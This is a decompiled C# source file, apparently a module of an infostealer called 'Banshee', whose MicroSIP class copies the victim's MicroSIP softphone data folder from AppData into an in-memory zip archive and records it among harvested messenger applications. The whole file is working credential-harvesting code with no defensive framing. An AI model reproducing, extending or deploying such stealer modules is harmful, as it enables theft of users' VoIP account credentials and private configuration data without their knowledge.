﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Messangers
{
	// Token: 0x02000043 RID: 67
	public class MicroSIP : ITarget
	{
		// Token: 0x06000097 RID: 151 RVA: 0x0000525C File Offset: 0x0000525C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MicroSIP");
			if (Directory.Exists(text))
			{
				string text2 = "MicroSIP\\";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "MicroSIP";
				zip.AddDirectoryFiles(text, ZipPath.Messengers(text2), true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
